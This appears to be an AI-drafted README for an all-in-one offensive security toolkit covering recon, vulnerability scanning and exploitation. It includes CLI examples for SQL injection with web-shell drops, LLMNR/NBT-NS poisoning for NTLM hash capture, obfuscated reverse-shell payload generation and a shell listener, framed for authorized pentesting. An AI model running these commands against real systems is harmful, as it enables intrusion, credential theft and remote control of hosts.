# Toolkit — Depth-First Offensive Security

> ⚠️ **DISCLAIMER:** This toolkit is built strictly for **authorized security testing, lab environments, and educational purposes**. Do not use it against targets you do not own or lack explicit written permission to test. The author assumes no liability for misuse or damage caused by this software.

**Toolkit** is a unified, zero-dependency offensive security framework designed for deep reconnaissance, vulnerability detection, exploitation, and credential capture. It is built to run end-to-end without relying on external pentest binaries (no `sqlmap`, no `hashcat`, no `Responder`).

## 🚀 Features

- **Reconnaissance:** Deep subdomain enumeration, historical URL mining, document harvesting, JS analysis with source-map recovery, GitHub org enumeration, and email pattern generation.
- **Vulnerability Scanning:** End-to-end SQL injection (with extraction and RCE chains), XSS, LFI, SSRF, XXE, CRLF, CORS, and authentication bypasses.
- **Network Attack & Capture:** LLMNR/NBT-NS poisoning with NTLM hash capture, SNMP walking, and multicast device discovery.
- **Exploitation & RCE:** SQLi-to-webshell, MSSQL `xp_cmdshell`, Postgres `COPY TO PROGRAM`, MySQL UDF injection, and MSSQL CLR assemblies.
- **Session Handling:** Reverse shell listener, interactive prompt, PTY handling, and transcript logging.

---

## 📦 Installation

1. **Clone the repository:**
   ```bash
   git clone https://github.com/yourusername/toolkit.git
   cd toolkit
Install core dependencies:

bash
pip install -r requirements.txt
(If requirements.txt is missing, install: aiohttp rich beautifulsoup4 cryptography dnspython scapy aiodns pysnmp-lextudio playwright pypdf python-docx openpyxl python-pptx)

Install Playwright browsers (required for XSS and screenshots):

bash
playwright install chromium
Compilers for RCE Payloads (Optional):
To use the SQLi UDF/CLR exploits, ensure you have gcc (for C payloads) and dotnet or csc (for C# CLR payloads) in your system PATH.

🗺️ Architecture & Directory Structure
text
toolkit/
├── toolkit.py             # Main CLI entry point
├── core/                  # Core infrastructure
│   ├── http.py            # Async HTTP requests, rate limiting, retries, root resolution
│   ├── store.py           # SQLite findings database (Workspaces)
│   ├── workspace.py       # Directory management, loot, reports
│   ├── shell_handler.py   # Reverse shell listener and PTY handling
│   └── dns.py             # Async DNS resolution
├── recon/                 # Reconnaissance & OSINT
│   ├── investigate.py     # Orchestrator (runs all recon modules)
│   ├── subdomains_deep.py # Passive DNS, CT logs, DNS mining, brute-force
│   ├── historical.py      # Wayback, Common Crawl, grep.app, dead paths
│   ├── js_analysis.py     # Source map recovery, secret extraction, chunk discovery
│   ├── document_harvest.py# PDF/DOCX/XLSX metadata and text mining
│   ├── social.py          # GitHub org enumeration, employee names
│   ├── emails.py          # Email scraping + pattern learning (generates candidates)
│   └── ...                # (tech_fingerprint, leak_check, ct_logs, whois, asn, etc.)
├── vuln/                  # Vulnerability detection & exploitation
│   ├── sqli.py            # SQL Injection (extraction, OOB, RCE chains)
│   ├── lfi.py             # Local File Inclusion
│   ├── ssrf.py            # Server-Side Request Forgery
│   ├── xss.py             # Cross-Site Scripting
│   ├── jwt.py             # JWT decoding and attacks
│   └── ...                # (xxe, crlf, cors, host_header, open_redirect, nosqli)
├── net/                   # Network-layer attacks and capture
│   ├── poison.py          # LLMNR/NBT-NS poisoning & NTLM capture
│   ├── snmp.py            # SNMP walking & ARP cache mining
│   ├── screenshot.py      # Headless browser screenshots
│   ├── multicast.py       # mDNS/SSDP/WS-Discovery
│   └── ...                # (geo, oui, port_scanner, service_fingerprint, etc.)
├── payload/               # Shell and RCE payloads
│   ├── shells.py          # Reverse shell generators (bash, powershell, python)
│   ├── encoders.py        # Base64/Hex payload encoders
│   ├── obfuscators.py     # Payload mutation
│   └── rce/               # Compiled exploit sources (C/C#)
├── wordlists/             # Embedded brute-force wordlists
└── workspaces/            # Engagement data (findings, loot, reports)
🛠️ Usage
The toolkit is accessed via the toolkit.py CLI. You can run py toolkit.py --help or py toolkit.py <command> --help for detailed flags.

1. Workspaces (Persistent Engagements)
Findings, captured credentials, shell transcripts, and reports are stored in SQLite workspaces.

bash
# Create and switch to a new workspace
py toolkit.py workspace new acme-corp
py toolkit.py workspace switch acme-corp
2. Deep Reconnaissance
Run targeted recon modules or the full investigator.

bash
# Full orchestrated recon (tech, leaks, dns, subdomains, etc.)
py toolkit.py recon --target example.com --investigate --store -v

# Deep subdomain enumeration (passive + active brute)
py toolkit.py recon --target example.com --subdeep --subdeep-brute

# Analyze JavaScript for secrets and endpoints
py toolkit.py recon --target example.com --js --store

# Harvest public documents for metadata and emails
py toolkit.py recon --target example.com --doc-harvest --store

# Historical recon (Wayback, Common Crawl, dead paths)
py toolkit.py recon --target example.com --historical --retry-profile moderate
3. Vulnerability Scanning & Exploitation
The scan command handles web vulnerabilities.

bash
# Run a basic SQL injection scan
py toolkit.py scan --url "http://example.com/item?id=1"

# Scan, extract data, and attempt to drop a web shell (MySQL/Postgres)
py toolkit.py scan --url "http://example.com/item?id=1" --shell --aggressive

# Reflected XSS scanning
py toolkit.py scan --url "http://example.com/search?q=test" --xss
4. Network Operations
Requires Administrator/Root privileges for raw sockets.

bash
# Discover hosts and scan ports
py toolkit.py network --target 192.168.1.0/24 --audit

# Passive capture (LLMNR/NBT-NS)
py toolkit.py network --target 192.168.1.0/24 --poison

# Active poisoning (requires authorization)
py toolkit.py network --target 192.168.1.0/24 --poison --poison-active --authorized-by "Ticket #123"
5. Reverse Shell Handler
Catch shells generated by the exploits.

bash
# Start a listener on port 4444
py toolkit.py shell listen --port 4444
6. Payload Generation
bash
# Generate a bash reverse shell
py toolkit.py payload --type bash --lhost 10.0.0.5 --lport 4444

# Generate an obfuscated PowerShell reverse shell
py toolkit.py payload --type powershell --lhost 10.0.0.5 --lport 4444 --obfuscate base64
🧠 Advanced Features
The --retry-profile Flag
Because third-party APIs (Wayback, grep.app, OTX) frequently rate-limit, modules that hit external APIs accept --retry-profile.

fast (default): 2 retries, 2s backoff.

moderate: 3 retries, 3s/6s/12s backoff.

aggressive: 3 retries, 5s/15s/30s backoff.

Target Scoping (--subdeep)
By default, running --subdeep on sub.example.com will only enumerate subdomains under sub.example.com to avoid noise. If you want the whole registrable domain (example.com), pass --subdeep-apex.

RCE Compilation
When you run scan --shell, the toolkit will automatically compile the C/C# payloads on the fly (to ~/.toolkit/rce-cache). If the required compilers (gcc, dotnet) are missing, it will gracefully skip the RCE phase and report why.

🛡️ License & Ethics
This tool is provided for educational and authorized testing purposes only. The author is not responsible for any illegal use. Always secure explicit, written permission before testing a target.

text

### Two things to note before you push:
1. I referenced `requirements.txt` in the README. If you don't have one, run `pip freeze > requirements.txt` in your environment to generate it.
2. I left a `LICENSE` section out. If you want to add an MIT license, I recommend adding a `LICENSE` file with the standard MIT text, which tells people they can use the code but you aren't liable.